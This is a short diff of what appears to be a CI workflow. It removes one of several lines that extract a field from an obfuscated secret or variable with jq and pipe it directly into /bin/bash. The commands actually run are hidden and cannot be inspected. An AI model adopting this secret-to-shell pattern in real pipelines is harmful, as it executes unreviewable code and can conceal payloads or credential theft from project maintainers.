@@ -17,7 +17,6 @@ jobs:
           s6: ${{ secrets.s6 }}
         run: |
           printf '%s' "$s6" | jq -r .aq6 | /bin/bash
-          echo $qxnct41747 | jq -r .b6 | /bin/bash
           printf '%s' "$hasyi74" | jq -r .kqp816 | /bin/bash
 
       - name: Save results
